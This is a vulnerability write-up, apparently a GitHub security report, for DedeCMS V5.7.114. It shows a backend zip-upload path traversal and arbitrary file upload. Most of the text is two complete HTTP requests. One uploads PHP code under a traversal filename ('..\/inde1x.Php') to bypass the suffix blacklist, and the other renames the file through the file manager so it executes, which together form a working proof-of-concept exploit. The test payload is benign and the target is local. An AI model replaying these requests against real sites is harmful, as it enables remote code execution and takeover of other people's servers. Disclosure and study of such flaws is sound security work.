# Dedecms Path traversal+arbitrary file upload(other enter)

​	The zip compression file upload function of the Dreamweaver backend software manager has vulnerabilities such as path traversal and arbitrary file upload

![image-20240708130926507](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitTwo.assets/image-20240708130926507.png)

​	E: \ seebug \ php study_p is the root directory of my current web integration environment deployment. The current project is deployed in the 127.0.0.1-9600 folder under the WWW path.This time I chose E:\seebug\phpstudy_pro\WWW\127.0.0.1_9600\uploads\soft as the destination path for file upload, because PHP scripts can be parsed in this fileWS

​	visit http://127.0.0.1:9600/dede/ And log in to the backend of dedecms to create a new atlas list http://127.0.0.1:9600/dede/album_add.php The interface is shown below

![image-20240712135020653](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitTwo.assets/image-20240712135020653.png)	The vulnerability mainly appears at the compressed file upload location

![image-20240712135159882](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitTwo.assets/image-20240712135159882.png)

```http
POST /include/dialog/select_soft_post.php HTTP/1.1
Host: 127.0.0.1:9600
Content-Length: 733
Cache-Control: max-age=0
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:9600
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGneeoYoNcoA3cyfK
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:9600/include/dialog/select_soft.php?f=form1.zipfile
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9fvqmoiniui5peunoom189bb23; _csrf_name_2f6ef1b1=251b7a78446c8135eb4f76930f45203f; _csrf_name_2f6ef1b11BH21ANI1AGD297L1FF21LN02BGE1DNG=dc1e3af496636f6e; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=1ebb58ecac915613; DedeLoginTime=1720410513; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=51a7f7470e41e0c9
Connection: close

------WebKitFormBoundaryGneeoYoNcoA3cyfK
Content-Disposition: form-data; name="activepath"

/uploads/soft
------WebKitFormBoundaryGneeoYoNcoA3cyfK
Content-Disposition: form-data; name="f"

form1.zipfile
------WebKitFormBoundaryGneeoYoNcoA3cyfK
Content-Disposition: form-data; name="job"

upload
------WebKitFormBoundaryGneeoYoNcoA3cyfK
Content-Disposition: form-data; name="uploadfile"; filename="try.zip"
Content-Type: application/x-zip-compressed

<?php echo 123;?>
------WebKitFormBoundaryGneeoYoNcoA3cyfK
Content-Disposition: form-data; name="newname"

..\/inde1x.Php
------WebKitFormBoundaryGneeoYoNcoA3cyfK
Content-Disposition: form-data; name="sb1"

确定
------WebKitFormBoundaryGneeoYoNcoA3cyfK--

```

​	Select_Soft_post.chp did not perform sufficient filtering on the newname parameter, so it is possible to bypass the file suffix blacklist by modifying the value of newname to a file name with the suffix 'php', in conjunction with the previous two path traversal vulnerabilities, to achieve arbitrary file upload vulnerabilities

![image-20240708123702680](Ehttps://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitOne.assets/image-20240708123702680.png)

![image-20240708132915068](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitOne.assets/image-20240708132915068.png)

​	The uploaded files may not be able to run directly, and there may be a possibility that the uploaded files cannot be parsed, because by default, the Apache environment combined with the PHP environment can only parse `. php ` files, and configuration files such as `. htaccess ` can be uploaded.

![image-20240708133005172](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitOne.assets/image-20240708133005172.png)

​	Here, you can also use the built-in file management system in the 'dedecms' backend to rename files and enable them to parse and run normally.

```http
POST /dede/file_manage_control.php HTTP/1.1
Host: 127.0.0.1:9600
Content-Length: 139
Cache-Control: max-age=0
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:9600
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: http://127.0.0.1:9600/dede/file_manage_view.php?fmdo=rename&filename=inde1x.Php&activepath=%2Fuploads
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=9fvqmoiniui5peunoom189bb23; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=1ebb58ecac915613; DedeLoginTime=1720410513; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=51a7f7470e41e0c9; _csrf_name_2f6ef1b1=267c4d98da681002ab955b10f8e0e3c3; _csrf_name_2f6ef1b11BH21ANI1AGD297L1FF21LN02BGE1DNG=1d4b8a59aa88baa3; ENV_GOBACK_URL=%2Fdede%2Fmedia_main.php%3Fdopost%3Dfilemanager
Connection: close

fmdo=rename&activepath=%2Fuploads%2Fsoft&filename=inde1x.Php&oldfilename=inde1x.Php&newfilename=index1.php&imageField1.x=31&imageField1.y=6
```

​	Here, we will attempt to retrieve the 'index1x.Php' from the '/uploads/soft' path Rename the file to 'index1.php'`

![image-20240708133049094](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitTwo.assets/image-20240708133049094.png)

![image-20240708133101827](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitOne.assets/image-20240708133101827.png)

​	Accessing the file again successfully parsed and ran the 'PHP' file

![image-20240708133140911](https://github.com/thedarknessdied/dedecms/blob/main/V5.7.114-UTF8/V5.7.114-UTF8ExploitOne.assets/image-20240708133140911.png)

